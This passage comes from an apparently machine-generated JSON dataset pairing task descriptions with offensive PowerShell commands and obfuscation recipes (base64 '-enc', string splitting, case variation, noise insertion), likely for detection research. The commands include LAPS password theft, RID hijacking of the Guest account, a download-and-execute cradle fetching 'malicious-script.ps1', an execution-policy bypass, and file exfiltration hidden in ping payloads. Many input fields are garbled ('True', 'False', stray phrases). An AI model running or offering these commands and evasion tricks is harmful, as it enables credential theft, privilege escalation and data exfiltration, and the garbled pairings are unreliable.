    "input": "Retrieve LAPS (Local Administrator Password Solution) passwords from a specified domain controller for the administrator account and format the output as a table.",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Retrieve LAPS (Local Administrator Password Solution) passwords from a specified domain controller for the administrator account and format the output as a table.",
    "origin_cmd": "Get-LAPSPasswords -DomainController 192.168.1.1 -Credential demo.com\\administrator | Format-Table -AutoSize"
  },
  {
    "input": "Retrieve LAPS (Local Administrator Password Solution) passwords from a specified domain controller for the administrator account and format the output as a table.",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Retrieve LAPS (Local Administrator Password Solution) passwords from a specified domain controller for the administrator account and format the output as a table.",
    "origin_cmd": "Get-LAPSPasswords -DomainController 192.168.1.1 -Credential demo.com\\administrator | Format-Table -AutoSize"
  },
  {
    "input": "True",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Retrieve LAPS (Local Administrator Password Solution) passwords from a specified domain controller for the administrator account and format the output as a table.",
    "origin_cmd": "Get-LAPSPasswords -DomainController 192.168.1.1 -Credential demo.com\\administrator | Format-Table -AutoSize"
  },
  {
    "input": "False",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Retrieve LAPS (Local Administrator Password Solution) passwords from a specified domain controller for the administrator account and format the output as a table.",
    "origin_cmd": "Get-LAPSPasswords -DomainController 192.168.1.1 -Credential demo.com\\administrator | Format-Table -AutoSize"
  },
  {
    "input": "Retrieve LAPS (Local Administrator Password Solution) passwords from a specified domain controller for the administrator account and format the output as a table.",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Retrieve LAPS (Local Administrator Password Solution) passwords from a specified domain controller for the administrator account and format the output as a table.",
    "origin_cmd": "Get-LAPSPasswords -DomainController 192.168.1.1 -Credential demo.com\\administrator | Format-Table -AutoSize"
  },
  {
    "input": "Retrieve LAPS (Local Administrator Password Solution) passwords from a specified domain controller for the administrator account and format the output as a table.",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Retrieve LAPS (Local Administrator Password Solution) passwords from a specified domain controller for the administrator account and format the output as a table.",
    "origin_cmd": "Get-LAPSPasswords -DomainController 192.168.1.1 -Credential demo.com\\administrator | Format-Table -AutoSize"
  },
  {
    "input": "True",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Retrieve LAPS (Local Administrator Password Solution) passwords from a specified domain controller for the administrator account and format the output as a table.",
    "origin_cmd": "Get-LAPSPasswords -DomainController 192.168.1.1 -Credential demo.com\\administrator | Format-Table -AutoSize"
  },
  {
    "input": "False",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Retrieve LAPS (Local Administrator Password Solution) passwords from a specified domain controller for the administrator account and format the output as a table.",
    "origin_cmd": "Get-LAPSPasswords -DomainController 192.168.1.1 -Credential demo.com\\administrator | Format-Table -AutoSize"
  },
  {
    "input": "Retrieve LAPS (Local Administrator Password Solution) passwords from a specified domain controller for the administrator account and format the output as a table.",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Retrieve LAPS (Local Administrator Password Solution) passwords from a specified domain controller for the administrator account and format the output as a table.",
    "origin_cmd": "Get-LAPSPasswords -DomainController 192.168.1.1 -Credential demo.com\\administrator | Format-Table -AutoSize"
  },
  {
    "input": "Perform RID (Relative Identifier) hijacking with the Guest account and RID value 1001.",
    "output": "Invoke-RIDHijacking -UseGuest -RID 1001",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Perform RID (Relative Identifier) hijacking with the Guest account and RID value 1001.",
    "origin_cmd": "Invoke-RIDHijacking -UseGuest -RID 1001"
  },
  {
    "input": "Perform RID hijacking with the Guest account and RID value 1001.",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Perform RID (Relative Identifier) hijacking with the Guest account and RID value 1001.",
    "origin_cmd": "Invoke-RIDHijacking -UseGuest -RID 1001"
  },
  {
    "input": "Perform RID (Relative Identifier) hijacking with the Guest account and RID value 1001.",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Perform RID (Relative Identifier) hijacking with the Guest account and RID value 1001.",
    "origin_cmd": "Invoke-RIDHijacking -UseGuest -RID 1001"
  },
  {
    "input": "Perform RID hijacking with Guest account and RID value 1001.",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Perform RID (Relative Identifier) hijacking with the Guest account and RID value 1001.",
    "origin_cmd": "Invoke-RIDHijacking -UseGuest -RID 1001"
  },
  {
    "input": "Perform RID (Relative Identifier) hijacking with the Guest account and RID value 1001.",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Perform RID (Relative Identifier) hijacking with the Guest account and RID value 1001.",
    "origin_cmd": "Invoke-RIDHijacking -UseGuest -RID 1001"
  },
  {
    "input": "Perform RID hijacking with the Guest account and RID value 1001.",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Perform RID (Relative Identifier) hijacking with the Guest account and RID value 1001.",
    "origin_cmd": "Invoke-RIDHijacking -UseGuest -RID 1001"
  },
  {
    "input": "Perform RID (Relative Identifier) hijacking with the Guest account and RID value 1001.",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Perform RID (Relative Identifier) hijacking with the Guest account and RID value 1001.",
    "origin_cmd": "Invoke-RIDHijacking -UseGuest -RID 1001"
  },
  {
    "input": "Perform RID hijacking with Guest account and RID value 1001.",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Perform RID (Relative Identifier) hijacking with the Guest account and RID value 1001.",
    "origin_cmd": "Invoke-RIDHijacking -UseGuest -RID 1001"
  },
  {
    "input": "Perform RID (Relative Identifier) hijacking with the Guest account and RID value 1001.",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Perform RID (Relative Identifier) hijacking with the Guest account and RID value 1001.",
    "origin_cmd": "Invoke-RIDHijacking -UseGuest -RID 1001"
  },
  {
    "input": "Perform RID hijacking with the Guest account and RID value 1001.",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Perform RID (Relative Identifier) hijacking with the Guest account and RID value 1001.",
    "origin_cmd": "Invoke-RIDHijacking -UseGuest -RID 1001"
  },
  {
    "input": "Perform RID (Relative Identifier) hijacking with the Guest account and RID value 1001.",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Perform RID (Relative Identifier) hijacking with the Guest account and RID value 1001.",
    "origin_cmd": "Invoke-RIDHijacking -UseGuest -RID 1001"
  },
  {
    "input": "Perform RID hijacking with Guest account and RID value 1001.",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Perform RID (Relative Identifier) hijacking with the Guest account and RID value 1001.",
    "origin_cmd": "Invoke-RIDHijacking -UseGuest -RID 1001"
  },
  {
    "input": "Perform RID (Relative Identifier) hijacking with the Guest account and RID value 1001.",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Perform RID (Relative Identifier) hijacking with the Guest account and RID value 1001.",
    "origin_cmd": "Invoke-RIDHijacking -UseGuest -RID 1001"
  },
  {
    "input": "Perform RID hijacking with the Guest account and RID value 1001.",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Perform RID (Relative Identifier) hijacking with the Guest account and RID value 1001.",
    "origin_cmd": "Invoke-RIDHijacking -UseGuest -RID 1001"
  },
  {
    "input": "Perform RID (Relative Identifier) hijacking with the Guest account and RID value 1001.",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Perform RID (Relative Identifier) hijacking with the Guest account and RID value 1001.",
    "origin_cmd": "Invoke-RIDHijacking -UseGuest -RID 1001"
  },
  {
    "input": "Perform RID hijacking with Guest account and RID value 1001.",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Perform RID (Relative Identifier) hijacking with the Guest account and RID value 1001.",
    "origin_cmd": "Invoke-RIDHijacking -UseGuest -RID 1001"
  },
  {
    "input": "Download and execute a PowerShell script from a remote URL.",
    "output": "powershell.exe -Command \"Invoke-Expression (New-Object Net.WebClient).DownloadString('http://website.com/malicious-script.ps1')\"",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Download and execute a PowerShell script from a remote URL.",
    "origin_cmd": "powershell.exe -Command \"Invoke-Expression (New-Object Net.WebClient).DownloadString('http://website.com/malicious-script.ps1')\""
  },
  {
    "input": ": (a). Download and execute a PowerShell script from a remote URL.",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a remote URL.",
    "origin_cmd": "powershell.exe -Command \"Invoke-Expression (New-Object Net.WebClient).DownloadString('http://website.com/malicious-script.ps1')\""
  },
  {
    "input": ": Download and execute a PowerShell script from a remote URL. This is another great old: 'Download and execute a PowerShell script from a remote URL'.",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Download and execute a PowerShell script from a remote URL.",
    "origin_cmd": "powershell.exe -Command \"Invoke-Expression (New-Object Net.WebClient).DownloadString('http://website.com/malicious-script.ps1')\""
  },
  {
    "input": ": Download and execute a PowerShell script from a remote URL.",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a remote URL.",
    "origin_cmd": "powershell.exe -Command \"Invoke-Expression (New-Object Net.WebClient).DownloadString('http://website.com/malicious-script.ps1')\""
  },
  {
    "input": "Download and execute a PowerShell script from a remote URL.",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Download and execute a PowerShell script from a remote URL.",
    "origin_cmd": "powershell.exe -Command \"Invoke-Expression (New-Object Net.WebClient).DownloadString('http://website.com/malicious-script.ps1')\""
  },
  {
    "input": ": (a). Download and execute a PowerShell script from a remote URL.",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a remote URL.",
    "origin_cmd": "powershell.exe -Command \"Invoke-Expression (New-Object Net.WebClient).DownloadString('http://website.com/malicious-script.ps1')\""
  },
  {
    "input": ": Download and execute a PowerShell script from a remote URL. This is another great old: 'Download and execute a PowerShell script from a remote URL'.",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Download and execute a PowerShell script from a remote URL.",
    "origin_cmd": "powershell.exe -Command \"Invoke-Expression (New-Object Net.WebClient).DownloadString('http://website.com/malicious-script.ps1')\""
  },
  {
    "input": ": Download and execute a PowerShell script from a remote URL.",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a remote URL.",
    "origin_cmd": "powershell.exe -Command \"Invoke-Expression (New-Object Net.WebClient).DownloadString('http://website.com/malicious-script.ps1')\""
  },
  {
    "input": "Download and execute a PowerShell script from a remote URL.",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Download and execute a PowerShell script from a remote URL.",
    "origin_cmd": "powershell.exe -Command \"Invoke-Expression (New-Object Net.WebClient).DownloadString('http://website.com/malicious-script.ps1')\""
  },
  {
    "input": ": (a). Download and execute a PowerShell script from a remote URL.",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a remote URL.",
    "origin_cmd": "powershell.exe -Command \"Invoke-Expression (New-Object Net.WebClient).DownloadString('http://website.com/malicious-script.ps1')\""
  },
  {
    "input": ": Download and execute a PowerShell script from a remote URL. This is another great old: 'Download and execute a PowerShell script from a remote URL'.",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Download and execute a PowerShell script from a remote URL.",
    "origin_cmd": "powershell.exe -Command \"Invoke-Expression (New-Object Net.WebClient).DownloadString('http://website.com/malicious-script.ps1')\""
  },
  {
    "input": ": Download and execute a PowerShell script from a remote URL.",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a remote URL.",
    "origin_cmd": "powershell.exe -Command \"Invoke-Expression (New-Object Net.WebClient).DownloadString('http://website.com/malicious-script.ps1')\""
  },
  {
    "input": "Download and execute a PowerShell script from a remote URL.",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Download and execute a PowerShell script from a remote URL.",
    "origin_cmd": "powershell.exe -Command \"Invoke-Expression (New-Object Net.WebClient).DownloadString('http://website.com/malicious-script.ps1')\""
  },
  {
    "input": ": (a). Download and execute a PowerShell script from a remote URL.",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a remote URL.",
    "origin_cmd": "powershell.exe -Command \"Invoke-Expression (New-Object Net.WebClient).DownloadString('http://website.com/malicious-script.ps1')\""
  },
  {
    "input": ": Download and execute a PowerShell script from a remote URL. This is another great old: 'Download and execute a PowerShell script from a remote URL'.",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Download and execute a PowerShell script from a remote URL.",
    "origin_cmd": "powershell.exe -Command \"Invoke-Expression (New-Object Net.WebClient).DownloadString('http://website.com/malicious-script.ps1')\""
  },
  {
    "input": ": Download and execute a PowerShell script from a remote URL.",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a remote URL.",
    "origin_cmd": "powershell.exe -Command \"Invoke-Expression (New-Object Net.WebClient).DownloadString('http://website.com/malicious-script.ps1')\""
  },
  {
    "input": "Execute a PowerShell script located at ${file_path}\\Get-Inbox.ps1 with specified parameters.",
    "output": "powershell -executionpolicy bypass -command ${file_path}\\Get-Inbox.ps1 -file ${output_file}",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Execute a PowerShell script located at ${file_path}\\Get-Inbox.ps1 with specified parameters.",
    "origin_cmd": "powershell -executionpolicy bypass -command ${file_path}\\Get-Inbox.ps1 -file ${output_file}"
  },
  {
    "input": "False",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute a PowerShell script located at ${file_path}\\Get-Inbox.ps1 with specified parameters.",
    "origin_cmd": "powershell -executionpolicy bypass -command ${file_path}\\Get-Inbox.ps1 -file ${output_file}"
  },
  {
    "input": "True",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Execute a PowerShell script located at ${file_path}\\Get-Inbox.ps1 with specified parameters.",
    "origin_cmd": "powershell -executionpolicy bypass -command ${file_path}\\Get-Inbox.ps1 -file ${output_file}"
  },
  {
    "input": "Execute a PowerShell script located at ${file_path}\\Get-Inbox.ps1 with specified parameters.",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute a PowerShell script located at ${file_path}\\Get-Inbox.ps1 with specified parameters.",
    "origin_cmd": "powershell -executionpolicy bypass -command ${file_path}\\Get-Inbox.ps1 -file ${output_file}"
  },
  {
    "input": "Execute a PowerShell script located at ${file_path}\\Get-Inbox.ps1 with specified parameters.",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Execute a PowerShell script located at ${file_path}\\Get-Inbox.ps1 with specified parameters.",
    "origin_cmd": "powershell -executionpolicy bypass -command ${file_path}\\Get-Inbox.ps1 -file ${output_file}"
  },
  {
    "input": "False",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute a PowerShell script located at ${file_path}\\Get-Inbox.ps1 with specified parameters.",
    "origin_cmd": "powershell -executionpolicy bypass -command ${file_path}\\Get-Inbox.ps1 -file ${output_file}"
  },
  {
    "input": "True",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Execute a PowerShell script located at ${file_path}\\Get-Inbox.ps1 with specified parameters.",
    "origin_cmd": "powershell -executionpolicy bypass -command ${file_path}\\Get-Inbox.ps1 -file ${output_file}"
  },
  {
    "input": "Execute a PowerShell script located at ${file_path}\\Get-Inbox.ps1 with specified parameters.",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute a PowerShell script located at ${file_path}\\Get-Inbox.ps1 with specified parameters.",
    "origin_cmd": "powershell -executionpolicy bypass -command ${file_path}\\Get-Inbox.ps1 -file ${output_file}"
  },
  {
    "input": "Execute a PowerShell script located at ${file_path}\\Get-Inbox.ps1 with specified parameters.",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Execute a PowerShell script located at ${file_path}\\Get-Inbox.ps1 with specified parameters.",
    "origin_cmd": "powershell -executionpolicy bypass -command ${file_path}\\Get-Inbox.ps1 -file ${output_file}"
  },
  {
    "input": "False",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute a PowerShell script located at ${file_path}\\Get-Inbox.ps1 with specified parameters.",
    "origin_cmd": "powershell -executionpolicy bypass -command ${file_path}\\Get-Inbox.ps1 -file ${output_file}"
  },
  {
    "input": "True",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Execute a PowerShell script located at ${file_path}\\Get-Inbox.ps1 with specified parameters.",
    "origin_cmd": "powershell -executionpolicy bypass -command ${file_path}\\Get-Inbox.ps1 -file ${output_file}"
  },
  {
    "input": "Execute a PowerShell script located at ${file_path}\\Get-Inbox.ps1 with specified parameters.",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute a PowerShell script located at ${file_path}\\Get-Inbox.ps1 with specified parameters.",
    "origin_cmd": "powershell -executionpolicy bypass -command ${file_path}\\Get-Inbox.ps1 -file ${output_file}"
  },
  {
    "input": "Execute a PowerShell script located at ${file_path}\\Get-Inbox.ps1 with specified parameters.",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Execute a PowerShell script located at ${file_path}\\Get-Inbox.ps1 with specified parameters.",
    "origin_cmd": "powershell -executionpolicy bypass -command ${file_path}\\Get-Inbox.ps1 -file ${output_file}"
  },
  {
    "input": "False",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute a PowerShell script located at ${file_path}\\Get-Inbox.ps1 with specified parameters.",
    "origin_cmd": "powershell -executionpolicy bypass -command ${file_path}\\Get-Inbox.ps1 -file ${output_file}"
  },
  {
    "input": "True",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Execute a PowerShell script located at ${file_path}\\Get-Inbox.ps1 with specified parameters.",
    "origin_cmd": "powershell -executionpolicy bypass -command ${file_path}\\Get-Inbox.ps1 -file ${output_file}"
  },
  {
    "input": "Execute a PowerShell script located at ${file_path}\\Get-Inbox.ps1 with specified parameters.",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute a PowerShell script located at ${file_path}\\Get-Inbox.ps1 with specified parameters.",
    "origin_cmd": "powershell -executionpolicy bypass -command ${file_path}\\Get-Inbox.ps1 -file ${output_file}"
  },
  {
    "input": "Ping a specified IP address by sending data read from a file.",
    "output": "$ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path ${input} -Encoding Byte -ReadCount 1024) { $ping.Send(\"${IPaddress}\", 1500, $Data) }",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Ping a specified IP address by sending data read from a file.",
    "origin_cmd": "$ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path ${input} -Encoding Byte -ReadCount 1024) { $ping.Send(\"${IPaddress}\", 1500, $Data) }"
  },
  {
    "input": "Ping an IP address by sending data read from a file.",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Ping a specified IP address by sending data read from a file.",
    "origin_cmd": "$ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path ${input} -Encoding Byte -ReadCount 1024) { $ping.Send(\"${IPaddress}\", 1500, $Data) }"
  },
  {
    "input": "Ping a specified IP address by sending data read from a file.",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Ping a specified IP address by sending data read from a file.",
    "origin_cmd": "$ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path ${input} -Encoding Byte -ReadCount 1024) { $ping.Send(\"${IPaddress}\", 1500, $Data) }"
  },
  {
    "input": "Paraphrase: Ping a specified IP address by sending data read from a file.",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Ping a specified IP address by sending data read from a file.",
    "origin_cmd": "$ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path ${input} -Encoding Byte -ReadCount 1024) { $ping.Send(\"${IPaddress}\", 1500, $Data) }"
  },
  {
    "input": "Ping a specified IP address by sending data read from a file.",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Ping a specified IP address by sending data read from a file.",
    "origin_cmd": "$ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path ${input} -Encoding Byte -ReadCount 1024) { $ping.Send(\"${IPaddress}\", 1500, $Data) }"
  },
  {
    "input": "Ping an IP address by sending data read from a file.",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Ping a specified IP address by sending data read from a file.",
    "origin_cmd": "$ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path ${input} -Encoding Byte -ReadCount 1024) { $ping.Send(\"${IPaddress}\", 1500, $Data) }"
  },
  {
    "input": "Ping a specified IP address by sending data read from a file.",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Ping a specified IP address by sending data read from a file.",
    "origin_cmd": "$ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path ${input} -Encoding Byte -ReadCount 1024) { $ping.Send(\"${IPaddress}\", 1500, $Data) }"
  },
  {
    "input": "Paraphrase: Ping a specified IP address by sending data read from a file.",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Ping a specified IP address by sending data read from a file.",
    "origin_cmd": "$ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path ${input} -Encoding Byte -ReadCount 1024) { $ping.Send(\"${IPaddress}\", 1500, $Data) }"
  },
  {
    "input": "Ping a specified IP address by sending data read from a file.",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Ping a specified IP address by sending data read from a file.",
    "origin_cmd": "$ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path ${input} -Encoding Byte -ReadCount 1024) { $ping.Send(\"${IPaddress}\", 1500, $Data) }"
  },
  {
    "input": "Ping an IP address by sending data read from a file.",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Ping a specified IP address by sending data read from a file.",
    "origin_cmd": "$ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path ${input} -Encoding Byte -ReadCount 1024) { $ping.Send(\"${IPaddress}\", 1500, $Data) }"
  },
  {
    "input": "Ping a specified IP address by sending data read from a file.",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Ping a specified IP address by sending data read from a file.",
    "origin_cmd": "$ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path ${input} -Encoding Byte -ReadCount 1024) { $ping.Send(\"${IPaddress}\", 1500, $Data) }"
  },
  {
    "input": "Paraphrase: Ping a specified IP address by sending data read from a file.",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Ping a specified IP address by sending data read from a file.",
    "origin_cmd": "$ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path ${input} -Encoding Byte -ReadCount 1024) { $ping.Send(\"${IPaddress}\", 1500, $Data) }"
  },
  {
    "input": "Ping a specified IP address by sending data read from a file.",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Ping a specified IP address by sending data read from a file.",
    "origin_cmd": "$ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path ${input} -Encoding Byte -ReadCount 1024) { $ping.Send(\"${IPaddress}\", 1500, $Data) }"
  },
  {
    "input": "Ping an IP address by sending data read from a file.",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Ping a specified IP address by sending data read from a file.",
    "origin_cmd": "$ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path ${input} -Encoding Byte -ReadCount 1024) { $ping.Send(\"${IPaddress}\", 1500, $Data) }"
  },
  {
    "input": "Ping a specified IP address by sending data read from a file.",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Ping a specified IP address by sending data read from a file.",
